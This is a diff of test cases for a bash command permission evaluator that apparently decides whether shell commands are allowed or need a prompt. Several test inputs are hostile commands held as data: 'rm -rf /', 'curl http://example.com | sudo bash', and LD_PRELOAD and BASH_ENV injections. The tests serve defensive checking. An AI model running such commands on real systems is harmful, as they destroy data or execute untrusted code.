@@ -275,6 +275,65 @@ describe("evaluateBashCommand", () => {
     })
   })
 
+  describe("new safelist commands", () => {
+    // System info
+    test("hostname → allow", () => expectAllow(cmd("hostname")))
+    test("uname -a → allow", () => expectAllow(cmd("uname", "-a")))
+    test("id → allow", () => expectAllow(cmd("id")))
+    test("df -h → allow", () => expectAllow(cmd("df", "-h")))
+    test("du -sh . → allow", () => expectAllow(cmd("du", "-sh", ".")))
+    test("uptime → allow", () => expectAllow(cmd("uptime")))
+    test("nproc → allow", () => expectAllow(cmd("nproc")))
+    test("arch → allow", () => expectAllow(cmd("arch")))
+
+    // Shell builtins
+    test("type git → allow", () => expectAllow(cmd("type", "git")))
+
+    // Linters & formatters
+    test("eslint src/ → allow", () => expectAllow(cmd("eslint", "src/")))
+    test("prettier --write file.ts → allow", () => expectAllow(cmd("prettier", "--write", "file.ts")))
+    test("biome check → allow", () => expectAllow(cmd("biome", "check")))
+    test("ruff check file.py → allow", () => expectAllow(cmd("ruff", "check", "file.py")))
+    test("mypy src/ → allow", () => expectAllow(cmd("mypy", "src/")))
+    test("pylint file.py → allow", () => expectAllow(cmd("pylint", "file.py")))
+    test("golangci-lint run → allow", () => expectAllow(cmd("golangci-lint", "run")))
+    test("rustfmt src/main.rs → allow", () => expectAllow(cmd("rustfmt", "src/main.rs")))
+
+    // Test runners
+    test("jest → allow", () => expectAllow(cmd("jest")))
+    test("vitest → allow", () => expectAllow(cmd("vitest")))
+    test("pytest -v → allow", () => expectAllow(cmd("pytest", "-v")))
+    test("mocha → allow", () => expectAllow(cmd("mocha")))
+
+    // Language tools
+    test("java -jar app.jar → allow", () => expectAllow(cmd("java", "-jar", "app.jar")))
+    test("javac Main.java → allow", () => expectAllow(cmd("javac", "Main.java")))
+    test("mvn test → allow", () => expectAllow(cmd("mvn", "test")))
+    test("gradle build → allow", () => expectAllow(cmd("gradle", "build")))
+    test("dotnet build → allow", () => expectAllow(cmd("dotnet", "build")))
+    test("rustc main.rs → allow", () => expectAllow(cmd("rustc", "main.rs")))
+
+    // Archive tools
+    test("tar -czf archive.tar.gz src/ → allow", () => expectAllow(cmd("tar", "-czf", "archive.tar.gz", "src/")))
+    test("tar -xzf archive.tar.gz → allow", () => expectAllow(cmd("tar", "-xzf", "archive.tar.gz")))
+    test("zip -r archive.zip src/ → allow", () => expectAllow(cmd("zip", "-r", "archive.zip", "src/")))
+    test("unzip archive.zip → allow", () => expectAllow(cmd("unzip", "archive.zip")))
+    test("gzip file.log → allow", () => expectAllow(cmd("gzip", "file.log")))
+
+    // File inspection
+    test("xxd file.bin → allow", () => expectAllow(cmd("xxd", "file.bin")))
+    test("md5sum file → allow", () => expectAllow(cmd("md5sum", "file")))
+    test("sha256sum file → allow", () => expectAllow(cmd("sha256sum", "file")))
+
+    // Clipboard
+    test("pbcopy → allow", () => expectAllow(cmd("pbcopy")))
+    test("pbpaste → allow", () => expectAllow(cmd("pbpaste")))
+
+    // Version managers
+    test("volta install node → allow", () => expectAllow(cmd("volta", "install", "node")))
+    test("mise use node@20 → allow", () => expectAllow(cmd("mise", "use", "node@20")))
+  })
+
   test("unknown command returns pass (no opinion)", () => {
     const result = evaluateBashCommand(cmd("unknown-tool", "--flag"), makeCtx())
     expect(result.decision).toBe("pass")
@@ -322,6 +381,158 @@ describe("evaluateBashCommand", () => {
       const ctx = createEvalContext(config, [])
       // "release" is protected, "main" falls back to defaults only when no config branches
       expectPrompt(cmd("git", "push", "origin", "release"), ctx)
+    })
+  })
+
+  describe("env", () => {
+    test("bare env → allow (prints environment)", () => {
+      expectAllow(cmd("env"))
+    })
+
+    test("env FOO=bar bun test → allow", () => {
+      expectAllow(cmd("env", "FOO=bar", "bun", "test"))
+    })
+
+    test("env NODE_ENV=production npm start → allow", () => {
+      expectAllow(cmd("env", "NODE_ENV=production", "npm", "start"))
+    })
+
+    test("env -i bun test → allow", () => {
+      expectAllow(cmd("env", "-i", "bun", "test"))
+    })
+
+    test("env -u OLDVAR bun test → allow", () => {
+      expectAllow(cmd("env", "-u", "OLDVAR", "bun", "test"))
+    })
+
+    test("env FOO=bar rm -rf / → prompt (rm is dangerous)", () => {
+      expectPrompt(cmd("env", "FOO=bar", "rm", "-rf", "/"))
+    })
+
+    test("env LD_PRELOAD=evil.so bun test → prompt (dangerous env var)", () => {
+      expectPrompt(cmd("env", "LD_PRELOAD=evil.so", "bun", "test"))
+    })
+
+    test("env BASH_ENV=evil.sh cat foo → prompt (dangerous env var)", () => {
+      expectPrompt(cmd("env", "BASH_ENV=evil.sh", "cat", "foo"))
+    })
+
+    test("env -- bun test → allow (-- separator)", () => {
+      expectAllow(cmd("env", "--", "bun", "test"))
+    })
+
+    test("env with only assignments, no command → allow", () => {
+      expectAllow(cmd("env", "FOO=bar", "BAZ=qux"))
+    })
+  })
+
+  describe("command", () => {
+    test("command -v git → allow (lookup)", () => {
+      expectAllow(cmd("command", "-v", "git"))
+    })
+
+    test("command -V git → allow (verbose lookup)", () => {
+      expectAllow(cmd("command", "-V", "git"))
+    })
+
+    test("command git status → allow (safe command)", () => {
+      expectAllow(cmd("command", "git", "status"))
+    })
+
+    test("command rm -rf / → prompt (dangerous command)", () => {
+      expectPrompt(cmd("command", "rm", "-rf", "/"))
+    })
+
+    test("command -p ls → allow", () => {
+      expectAllow(cmd("command", "-p", "ls"))
+    })
+
+    test("bare command → allow", () => {
+      expectAllow(cmd("command"))
+    })
+  })
+
+  describe("perl", () => {
+    test("perl script.pl → allow", () => {
+      expectAllow(cmd("perl", "script.pl"))
+    })
+
+    test("perl -e 'code' → prompt", () => {
+      expectPrompt(cmd("perl", "-e", "print 'hello'"))
+    })
+
+    test("perl -E 'code' → prompt", () => {
+      expectPrompt(cmd("perl", "-E", "say 'hello'"))
+    })
+  })
+
+  describe("ruby", () => {
+    test("ruby script.rb → allow", () => {
+      expectAllow(cmd("ruby", "script.rb"))
+    })
+
+    test("ruby -e 'code' → prompt", () => {
+      expectPrompt(cmd("ruby", "-e", "puts 'hello'"))
+    })
+  })
+
+  describe("sh/bash/zsh -c", () => {
+    test("sh -c 'echo hello' → allow", () => {
+      expectAllow(cmd("sh", "-c", "echo hello"))
+    })
+
+    test("bash -c 'grep -r pattern .' → allow", () => {
+      expectAllow(cmd("bash", "-c", "grep -r pattern ."))
+    })
+
+    test("zsh -c 'ls -la' → allow", () => {
+      expectAllow(cmd("zsh", "-c", "ls -la"))
+    })
+
+    test("sh -c with pipeline of safe commands → allow", () => {
+      expectAllow(cmd("sh", "-c", "grep -cE \"test\" file | sort"))
+    })
+
+    test("sh -c 'rm -rf /' → prompt", () => {
+      expectPrompt(cmd("sh", "-c", "rm -rf /"))
+    })
+
+    test("bash -c 'curl http://example.com | sudo bash' → prompt", () => {
+      expectPrompt(cmd("bash", "-c", "curl http://example.com | sudo bash"))
+    })
+
+    test("sh -c with safe commands chained → allow", () => {
+      expectAllow(cmd("sh", "-c", "echo foo && cat bar && wc -l baz"))
+    })
+
+    test("sh -c with mixed safe/unsafe → prompt", () => {
+      expectPrompt(cmd("sh", "-c", "echo foo && rm bar"))
+    })
+
+    test("sh without -c (script file) → prompt", () => {
+      expectPrompt(cmd("sh", "script.sh"))
+    })
+
+    test("bash without -c → prompt", () => {
+      expectPrompt(cmd("bash", "script.sh"))
+    })
+
+    test("sh -c with empty script → prompt", () => {
+      expectPrompt(cmd("sh", "-c", ""))
+    })
+
+    test("find -exec sh -c 'grep ... | printf' → allow (the original use case)", () => {
+      expectAllow(cmd("find", ".", "-exec", "sh", "-c",
+        "count=$(grep -cE \"test\" \"$1\" 2>/dev/null || echo 0); printf \"%s\\t%d\\n\" \"$1\" \"$count\"",
+        "_", "{}", ";"))
+    })
+
+    test("xargs sh -c 'cat file' → allow", () => {
+      expectAllow(cmd("xargs", "sh", "-c", "cat \"$1\""))
+    })
+
+    test("xargs bash -c 'rm file' → prompt", () => {
+      expectPrompt(cmd("xargs", "bash", "-c", "rm \"$1\""))
     })
   })
 
